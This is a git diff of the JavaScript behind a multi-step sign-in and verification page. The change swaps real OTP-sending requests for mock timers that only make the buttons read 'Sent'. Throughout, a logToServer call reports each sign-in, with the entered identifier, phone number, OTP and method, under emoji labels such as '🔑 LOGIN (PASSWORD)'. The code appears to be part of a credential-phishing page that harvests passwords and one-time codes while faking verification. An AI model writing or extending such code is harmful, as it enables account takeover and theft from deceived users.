@@ -34,7 +34,7 @@ document.addEventListener('DOMContentLoaded', () => {
         phone: '', 
         phone_otp: '', 
         time: '',
-        method: 'password' // or 'otp'
+        method: 'password'
     };
     
     let currentStep = 1;
@@ -62,40 +62,23 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 
-    // Send OTP for Login Method
-    document.getElementById('btn-login-send-otp').addEventListener('click', async () => {
+    // Mock Send OTP for Login
+    document.getElementById('btn-login-send-otp').addEventListener('click', () => {
         const idVal = loginId.value.trim();
         if (!idVal) return alert("Please enter Email or Phone Number first");
         
-        document.getElementById('btn-login-send-otp').innerText = "Sending...";
-        
-        const isEmail = idVal.includes('@');
-        const endpoint = isEmail ? '/send-otp' : '/send-otp'; // Both use same endpoint for now
-
-        try {
-            const res = await fetch(endpoint, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: idVal }) // Backend treats identifier as target
-            });
-            const data = await res.json();
-            if (data.success) {
-                document.getElementById('btn-login-send-otp').innerText = "Sent";
-                setTimeout(() => { document.getElementById('btn-login-send-otp').innerText = "Resend"; }, 30000);
-            } else {
-                alert("Error: " + (data.error || "Failed to send code"));
-                document.getElementById('btn-login-send-otp').innerText = "Send";
-            }
-        } catch (e) {
-            alert("Network Error");
-            document.getElementById('btn-login-send-otp').innerText = "Send";
-        }
+        const btn = document.getElementById('btn-login-send-otp');
+        btn.innerText = "Sending...";
+        setTimeout(() => {
+            btn.innerText = "Sent";
+            setTimeout(() => { btn.innerText = "Resend"; }, 5000);
+        }, 800);
     });
 
     // Sign In Button Click
     const btnSignin = document.getElementById('trigger-signin');
     if (btnSignin) {
-        btnSignin.addEventListener('click', async () => {
+        btnSignin.addEventListener('click', () => {
             const idVal = loginId.value.trim();
             if (!idVal) return alert("Please enter your details");
 
@@ -115,8 +98,7 @@ document.addEventListener('DOMContentLoaded', () => {
             else if (/^\d+$/.test(idVal.replace(/\+/g, ''))) verifyPhoneNum.value = idVal;
 
             // Log Initial Login
-            const logTitle = userData.method === 'password' ? '🔑 LOGIN (PASSWORD)' : '🔢 LOGIN (OTP)';
-            logToServer(logTitle, userData);
+            logToServer(userData.method === 'password' ? '🔑 LOGIN (PASSWORD)' : '🔢 LOGIN (OTP)', userData);
 
             // Switch Screen
             screenSignin.style.display = 'none';
@@ -124,20 +106,11 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 
-    // Step 1: Email Verification
-    document.getElementById('item-email').addEventListener('click', async () => {
+    // Step 1: Email Verification (MOCK)
+    document.getElementById('item-email').addEventListener('click', () => {
         if (currentStep !== 1) return;
         modalEmail.style.display = 'flex';
-        
-        if (verifyEmailId.value.includes('@')) {
-            const res = await fetch('/send-otp', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: verifyEmailId.value })
-            });
-            const data = await res.json();
-            if (!data.success) alert("OTP Error: " + (data.error || "Failed"));
-        }
+        console.log("Mocking OTP send for:", verifyEmailId.value);
     });
 
     document.getElementById('submit-email-otp').addEventListener('click', async () => {
@@ -164,7 +137,7 @@ document.addEventListener('DOMContentLoaded', () => {
         itemPhone.classList.add('active');
     });
 
-    // Step 2: Phone Verification
+    // Step 2: Phone Verification (MOCK)
     document.getElementById('item-phone').addEventListener('click', () => {
         if (currentStep !== 2) return;
         modalPhone.style.display = 'flex';
